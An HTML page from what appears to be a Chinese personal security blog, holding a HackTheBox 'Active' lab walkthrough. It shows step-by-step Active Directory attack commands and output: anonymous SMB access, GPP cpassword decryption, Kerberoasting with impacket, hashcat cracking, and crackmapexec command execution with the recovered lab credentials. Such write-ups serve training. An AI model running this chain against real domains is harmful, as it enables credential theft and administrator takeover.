<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="Unc1e的博客">
<meta property="og:url" content="http://unc1e.com/page/4/index.html">
<meta property="og:site_name" content="Unc1e的博客">
<meta property="article:author" content="Unc1e">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://unc1e.com/page/4/"/>





  <title>Unc1e的博客</title>
  








<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Unc1e的博客</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2020/06/27/yuque/HackTheBox%EF%BC%9AActive%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Unc1e">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Unc1e的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/06/27/yuque/HackTheBox%EF%BC%9AActive%E7%AC%94%E8%AE%B0/" itemprop="url">HackTheBox：Active笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-27T23:09:32+08:00">
                2020-06-27
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1593282512907-313f899a-aeaf-4fd0-ba16-87cc06dacf44.png#align=left&display=inline&height=303&margin=%5Bobject%20Object%5D&name=Deepin%20%E6%88%AA%E5%9C%96_select-area_20200628022810.png&originHeight=606&originWidth=1041&size=179864&status=done&style=none&width=521" alt="Deepin 截圖_select-area_20200628022810.png"><br>10.10.10.100</p>
<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	nmap -p- -sC -sV -oA allport.nmap 10.10.10.100</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.10</span>.<span class="number">10.100</span></span><br><span class="line">Host is up (<span class="number">0.0036</span>s latency).</span><br><span class="line">Not shown: <span class="number">65512</span> closed ports</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line"><span class="number">53</span>/tcp    open  domain        Microsoft DNS <span class="number">6.1</span>.<span class="number">7601</span> (<span class="number">1</span>DB15D39) (Windows Server <span class="number">2008</span> R2 SP1)</span><br><span class="line">| dns<span class="literal">-nsid</span>:</span><br><span class="line">|_  bind.version: Microsoft DNS <span class="number">6.1</span>.<span class="number">7601</span> (<span class="number">1</span>DB15D39)</span><br><span class="line"><span class="number">88</span>/tcp    open  kerberos<span class="literal">-sec</span>  Microsoft Windows Kerberos (server time: <span class="number">2020</span><span class="literal">-06</span><span class="literal">-27</span> <span class="number">14</span>:<span class="number">12</span>:<span class="number">30</span>Z)</span><br><span class="line"><span class="number">135</span>/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">139</span>/tcp   open  netbios<span class="literal">-ssn</span>   Microsoft Windows netbios<span class="literal">-ssn</span></span><br><span class="line"><span class="number">389</span>/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default<span class="literal">-First</span><span class="literal">-Site</span><span class="literal">-Name</span>)</span><br><span class="line"><span class="number">445</span>/tcp   open  microsoft<span class="literal">-ds</span>?</span><br><span class="line"><span class="number">464</span>/tcp   open  tcpwrapped</span><br><span class="line"><span class="number">593</span>/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP <span class="number">1.0</span></span><br><span class="line"><span class="number">636</span>/tcp   open  tcpwrapped</span><br><span class="line"><span class="number">3268</span>/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default<span class="literal">-First</span><span class="literal">-Site</span><span class="literal">-Name</span>)</span><br><span class="line"><span class="number">3269</span>/tcp  open  tcpwrapped</span><br><span class="line"><span class="number">5722</span>/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">9389</span>/tcp  open  mc<span class="literal">-nmf</span>        .NET Message Framing</span><br><span class="line"><span class="number">47001</span>/tcp open  http          Microsoft HTTPAPI httpd <span class="number">2.0</span> (SSDP/UPnP)</span><br><span class="line">|_http<span class="literal">-server</span><span class="literal">-header</span>: Microsoft<span class="literal">-HTTPAPI</span>/<span class="number">2.0</span></span><br><span class="line">|_http<span class="literal">-title</span>: Not Found</span><br><span class="line"><span class="number">49152</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49153</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49154</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49155</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49157</span>/tcp open  ncacn_http    Microsoft Windows RPC over HTTP <span class="number">1.0</span></span><br><span class="line"><span class="number">49158</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49169</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49171</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49180</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_c<span class="built_in">lock-skew</span>: <span class="number">2</span>m57s</span><br><span class="line">| smb2<span class="literal">-security</span><span class="literal">-mode</span>:</span><br><span class="line">|   <span class="number">2.02</span>:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2<span class="literal">-time</span>:</span><br><span class="line">|   date: <span class="number">2020</span><span class="literal">-06</span><span class="literal">-27T14</span>:<span class="number">13</span>:<span class="number">29</span></span><br><span class="line">|_  start_date: <span class="number">2020</span><span class="literal">-06</span><span class="literal">-27T12</span>:<span class="number">57</span>:<span class="number">05</span></span><br></pre></td></tr></table></figure>

<p>用<code>enum4linux</code>工具扫描，发现 smb 服务是开着的，且有开放的共享目录</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># enum4linux -a 10.10.10.100</span></span><br><span class="line"></span><br><span class="line">=========================================</span><br><span class="line">| Share Enumeration on 10.10.10.100 |</span><br><span class="line">=========================================</span><br><span class="line">Use of uninitialized value \$global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.</span><br><span class="line"></span><br><span class="line"><span class="code">    Sharename       Type      Comment</span></span><br><span class="line"><span class="code">    ---------       ----      -------</span></span><br><span class="line"><span class="code">    ADMIN$          Disk      Remote Admin</span></span><br><span class="line"><span class="code">    C$              Disk      Default share</span></span><br><span class="line"><span class="code">    IPC$            IPC       Remote IPC</span></span><br><span class="line"><span class="code">    NETLOGON        Disk      Logon server share</span></span><br><span class="line"><span class="code">    Replication     Disk</span></span><br><span class="line"><span class="code">    SYSVOL          Disk      Logon server share</span></span><br><span class="line"><span class="code">    Users           Disk</span></span><br><span class="line"></span><br><span class="line">SMB1 disabled -- no workgroup available</span><br><span class="line">...</span><br><span class="line">[+] Attempting to map shares on 10.10.10.100</span><br><span class="line">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.</span><br><span class="line">//10.10.10.100/ADMIN$ Mapping: DENIED, Listing: N/A</span><br><span class="line"></span><br><span class="line">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.</span><br><span class="line">//10.10.10.100/C$ Mapping: DENIED, Listing: N/A</span><br><span class="line"></span><br><span class="line">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.</span><br><span class="line">//10.10.10.100/IPC$ Mapping: OK Listing: DENIED</span><br><span class="line"></span><br><span class="line">Use of uninitialized value \$global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.</span><br><span class="line">//10.10.10.100/NETLOGON Mapping: DENIED, Listing: N/A</span><br><span class="line"></span><br><span class="line">Use of uninitialized value \$global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.</span><br><span class="line">//10.10.10.100/Replication Mapping: OK, Listing: OK</span><br><span class="line"></span><br><span class="line">Use of uninitialized value \$global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.</span><br><span class="line">//10.10.10.100/SYSVOL Mapping: DENIED, Listing: N/A</span><br><span class="line"></span><br><span class="line">Use of uninitialized value \$global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.</span><br><span class="line">//10.10.10.100/Users Mapping: DENIED, Listing: N/A</span><br></pre></td></tr></table></figure>

<p>看看里面都有些啥文件</p>
<h1 id="smb-gt-group-xml"><a href="#smb-gt-group-xml" class="headerlink" title="smb -&gt; group.xml"></a>smb -&gt; group.xml</h1><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># smbmap -H 10.10.10.100</span></span><br><span class="line"></span><br><span class="line">[+] IP: 10.10.10.100:445 Name: 10.10.10.100  </span><br><span class="line"> Disk Permissions Comment</span><br><span class="line">---- ----------- -------</span><br><span class="line">ADMIN$             	NO ACCESS	Remote Admin</span><br><span class="line"><span class="code">	C$ NO ACCESS Default share</span></span><br><span class="line">IPC\$ NO ACCESS Remote IPC</span><br><span class="line">NETLOGON NO ACCESS Logon server share</span><br><span class="line">Replication READ ONLY</span><br><span class="line">SYSVOL NO ACCESS Logon server share</span><br><span class="line">Users NO ACCESS</span><br></pre></td></tr></table></figure>

<p>空密码登录上去，成了。（此处也可用这种方式来空密码      登录<code>smbclient //10.10.10.100/Replication -U %</code></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># smbclient -H //10.10.10.100/Replication -R -U ''</span></span><br><span class="line"></span><br><span class="line">handle<span class="emphasis">_name_</span>resolve_order: WARNING: Ignoring invalid list value '-U' for parameter 'name resolve order'</span><br><span class="line">Anonymous login successful</span><br><span class="line">Try "help" to get a list of possible commands.</span><br><span class="line">smb: \&gt;</span><br></pre></td></tr></table></figure>

<p>发现了个名为<code>cpassword</code>的敏感信息<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1593275741345-89a571a5-0b88-429d-959a-04f87555181f.png#align=left&display=inline&height=67&margin=%5Bobject%20Object%5D&name=group_xml.png&originHeight=172&originWidth=1912&size=76971&status=done&style=none&width=746" alt="group_xml.png"></p>
<h1 id="密码破解-gpp"><a href="#密码破解-gpp" class="headerlink" title="密码破解:gpp"></a>密码破解:gpp</h1><p>一番搜索得知，这个密码就是 windows 的密码，不过是用 AES 加了密的，可是微软官方<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN#endNote2" target="_blank" rel="noopener">在这里</a>提供了解密的密钥，导致可以获取原密码。理论支撑<a href="https://blog.compass-security.com/2012/04/exploit-credentials-stored-in-windows-group-policy-preferences/" target="_blank" rel="noopener">在这里</a>。<br>此处我们采用脚本<a href="https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py" target="_blank" rel="noopener">gpprefdecrypt.py</a>进行解密（当然用 kali 自带的<code>gpp-decrypt</code>也行</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># python Gpprefdecrypt.py 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'</span></span><br><span class="line"></span><br><span class="line"><span class="code">    GPPstillStandingStrong2k18</span></span><br></pre></td></tr></table></figure>

<p>至此，我们已经获得一组用户的帐号密码<code>SVC_TGS : GPPstillStandingStrong2k18</code>，域名称是<code>active.htb</code><br>由于靶机的 5985/5986 端口未开放，不能用 evil-rm 来验证。可以用 msf 里的<code>smb_login</code>模块，来验证这个凭据是否有效。<br>不过这里，我采用 smbclient 来登录到共享文件夹，从而获取<code>user.txt</code></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># smbclient //10.10.10.100/Users -U SVC_TGS%GPPstillStandingStrong2k18</span></span><br></pre></td></tr></table></figure>

<p>此外，还有一个 cme[<code>crackmapexec</code>]，作为 windows 域渗透时常用到的工具，也可以登录并执行命令（执行命令需 system 权限），如图<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1593357285845-a8a530b3-f6b1-4708-9d0a-9dbf5c1984c6.png#align=left&display=inline&height=587&margin=%5Bobject%20Object%5D&name=cme.png&originHeight=587&originWidth=1917&size=379101&status=done&style=none&width=1917" alt="cme.png"><br>登录</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># crackmapexec smb 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18</span></span><br><span class="line"></span><br><span class="line">SMB 10.10.10.100 445 DC [*] Windows 6.1 Build 7601 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB 10.10.10.100 445 DC [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18</span><br></pre></td></tr></table></figure>

<p>问题来了，怎么拿到 user 的 shell 呢<br>尝试使用 msf 的 windows/smb/psexec 模块，结果失败，原因是模块必须要管理员权限（下文有写到）</p>
<blockquote>
<p>This module uses a <strong>valid administrator username</strong> and password (or<br> password hash) to execute an arbitrary payload.</p>
</blockquote>
<p>一番操作无果，无奈寻找其它方式</p>
<h1 id="提权-Kerberoasting"><a href="#提权-Kerberoasting" class="headerlink" title="提权:Kerberoasting"></a>提权:Kerberoasting</h1><p>关于<code>Kerberoasting</code>的详细说明，三好学生师傅<a href="https://3gstudent.github.io/3gstudent.github.io/域渗透-Kerberoasting/" target="_blank" rel="noopener">在这里</a>已经说得很好了。简单来说，这种方式主要有如下几个要点：</p>
<ol>
<li>域内的主机都能查询 SPN。因此利用时可以考虑以下两种关系<ul>
<li>该 SPN 注册在域用户帐户(Users)下 =&gt; administrator 是默认的用户</li>
<li>域用户账户的权限很高     =&gt; administrator 权限当然很高</li>
</ul>
</li>
<li>域内的任何用户都可以向域内的任何服务请求 TGS    =&gt;    此处由<code>SVC_TGS</code>到<code>administrator</code></li>
<li>在 kerberos 认证过程的第 4 步中，用户将会收到由目标服务实例的 NTLM hash 加密生成的 TGS(service ticket)，加密算法为<code>RC4-HMAC</code>，有现成的爆破工具(hashcat)。有兴趣了解这种算法的师傅可以在<a href="https://tools.ietf.org/html/rfc4757" target="_blank" rel="noopener">rfc4757:RC4-HMAC</a>中找到更多信息。</li>
<li>当获得这个 TGS 后，我们可以使用密码字典，模拟加密过程，一次次生成 TGS 进行比较，来尝试穷举口令。</li>
</ol>
<p>同时，根据 att&amp;ck 框架的描述，这种攻击手法可以用以下几种方式来完成</p>
<blockquote>
<p>Kerberoasting, Technique T1208 - Enterprise | MITRE ATT&amp;CK®<br><a href="https://attack.mitre.org/techniques/T1208/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1208/</a></p>
<table>
<thead>
<tr>
<th>Name</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td><a href="https://attack.mitre.org/software/S0363" target="_blank" rel="noopener"> Empire </a></td>
<td><a href="https://attack.mitre.org/software/S0363" target="_blank" rel="noopener">Empire</a> uses <a href="https://attack.mitre.org/software/S0194" target="_blank" rel="noopener">PowerSploit</a>‘s <code>Invoke-Kerberoast</code> to request service tickets and return crackable ticket hashes.<a href="https://github.com/PowerShellEmpire/Empire" target="_blank" rel="noopener">[10]</a></td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/software/S0357" target="_blank" rel="noopener"> Impacket </a></td>
<td><a href="https://attack.mitre.org/software/S0357" target="_blank" rel="noopener">Impacket</a> modules like GetUserSPNs can be used to get Service Principal Names (SPNs) for user accounts. The output is formatted to be compatible with cracking tools like John the Ripper and Hashcat.<a href="https://www.secureauth.com/labs/open-source-tools/impacket" target="_blank" rel="noopener">[9]</a></td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/software/S0194" target="_blank" rel="noopener"> PowerSploit </a></td>
<td><a href="https://attack.mitre.org/software/S0194" target="_blank" rel="noopener">PowerSploit</a>‘s <code>Invoke-Kerberoast</code> module can request service tickets and return crackable ticket hashes.<a href="https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/" target="_blank" rel="noopener">[8]</a><a href="https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/" target="_blank" rel="noopener">[5]</a></td>
</tr>
</tbody></table>
</blockquote>
<blockquote>
</blockquote>
<p>这里采用 impacket 套件的<code>GetUserSPNs</code>脚本，运行</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS -request</span></span><br><span class="line"></span><br><span class="line">/usr/share/doc/python3-impacket/examples/GetUserSPNs.py:438: SyntaxWarning: "is" with a literal. Did you mean "=="?</span><br><span class="line">if userDomain is '':</span><br><span class="line">Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">ServicePrincipalName Name MemberOf PasswordLastSet LastLogon</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-19 03:06:40.351723 2018-07-31 01:17:40.656520</span><br><span class="line"></span><br><span class="line">$krb5tgs$23$<span class="emphasis">*Administrator$ACTIVE.HTB$active/CIFS~445*</span>$22e12dfea4b9454f2eb6bc1532ce33da\$71a6ca7735386847e09dba2becbc27c296c0cc3d5bf52d4a9ced6504fb07d4cfede8199a9eee2190c24f5033c2c34408dfbc6cbf857ae55681913eaae1c8cc05699beb165b6946483150410fff3cd7e817bf45ba99825b10b1e5a9965b1b2aff022b469de01e7d6a28ae728bf46a43da29e78133d0abdd3aa3da7059385d1a331047f730455d6153e391303436821a317d2c1fa610464f92e3a9374ba87520b44a00b8d01a0db658c91a46d611bd1b1ac14a2a99b6ad296e07a845c5eebda3e82e36075d4bea9ca98e9e6c1a375510ac53ff1d9334851370cbb25d3b2941231ef4ac08c76b5c6d733927a6664e5db73f8b6681a10e252ee99d07049fd2646969bb40b7cec54349ee024403a8112dc90b8d148d3cdbe19a8141a3b6724ba6107bc112aab92e9b7a6f4123566c425082e84e5937defec68499ddc827fb3298c9057cb919fff3436f28250d359a6d65e21094932a362e3ed163ed297566da663db3c629de4b15ee5a6041483b4d3c2d94546b46b0ff589fe86a83446a3290b157dc769716beff038a7cf1ec999c8d81b5bdcd92c2820c159c6c786efd0a592ddc4f70286b666e423f857aa39245a11cce82a4e586103af79c8f1c8922bcdb02e0ac367c21003c574b35b63094c2dd99f9cbec01bde35ec1629f30cb8a0d7fdb120065359fba1884b5b4010798f9b9f5f76a4f72fca8f8b9e1ce8e3b9d3ebc3913a655860f7da052f298369483b3e5a024fd264a44ee1af3b1b30f62f3443aa1d690c2f953d03937504d248cd93f01c0152873780de1063ed40f960e2fb285ba6c82a9e723bc513b69b07f48ef65e61bb98e066e78deded46e9c879384fc36f41997958a135611bc637f44a0a34fe31729da3d1a4dd3822d6a381844257befd36aaa677d80b8a617c7c1f6085d3a6fde8121ff458a12600088d73ccccd9cd343385163f0a1ad40d551062db8dedd4d0247b7ceca5d6871dbec589a91cd935840c307b51255687d240b83e2eafe9134f568e40639d3c386a4ebdb8ac716405d14163435d4297c5265a1a2904a4d3a2d241516aa5dc68b66f2bd88b20443aa5f40539b5403f1dc0cbdfb77e803a63dcd633f94be80bf7aa625322f30b4ae43489d965e844fb9fe074874b4d42607c452ad0cce4f7a7fd33079baebc973b0a5c6a23951753eec8eeb93dcc97f36fc1662f9fc51ef2be91a40ea8009d5cc76cfaaf756194a8c66e8e906db5fda9003b4cd673edd19012f2870c748b4e089</span><br><span class="line"></span><br><span class="line"><span class="section">## 参数说明</span></span><br><span class="line"></span><br><span class="line">-dc-ip 域控的 ip 地址，此处靶机就是域控</span><br><span class="line">active.htb/SVC_TGS 域名称+用户名</span><br><span class="line">-request 请求用户的 TGS，并且按照 JtR 或者/hashcat 能识别的格式打印出来（默认关闭）</span><br><span class="line">-outputfile 以 JtR/hashcat 的格式输出到文件中</span><br></pre></td></tr></table></figure>

<p>得到一串管理员的 hash，用 hashcat 解密</p>
<blockquote>
</blockquote>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force -o res.txt</span></span><br><span class="line"></span><br><span class="line"><span class="section"># cat res.txt</span></span><br><span class="line"></span><br><span class="line">...master1968(省略部分信息)</span><br></pre></td></tr></table></figure>

<p>登录 smb 即可获取 root.txt</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //<span class="number">10.10</span>.<span class="number">10.100</span>/Users <span class="literal">-U</span> active.htb\\SVC_TGS%GPPstillStandingStrong2k18</span><br></pre></td></tr></table></figure>

<p>或者用老外爱用的 cme（即 CrackMapExec）</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># crackmapexec smb 10.10.10.100 -u Administrator -p "Ticketmaster1968" --pass-pol</span></span><br><span class="line"></span><br><span class="line">//查看域内密码策略 --pass-pol  </span><br><span class="line">SMB 10.10.10.100 445 DC [*] Windows 6.1 Build 7601 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB 10.10.10.100 445 DC [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)</span><br><span class="line"></span><br><span class="line"><span class="section"># crackmapexec smb 10.10.10.100 -u Administrator -p "Ticketmaster1968" -x whoami</span></span><br><span class="line"></span><br><span class="line">//执行命令 -x</span><br><span class="line">SMB 10.10.10.100 445 DC [*] Windows 6.1 Build 7601 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB 10.10.10.100 445 DC [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)</span><br><span class="line">SMB 10.10.10.100 445 DC [+] Executed command</span><br><span class="line">SMB 10.10.10.100 445 DC active\administrator</span><br></pre></td></tr></table></figure>

<p>也可用 msf 里的 psexec 拿 shell，要求管理员权限</p>
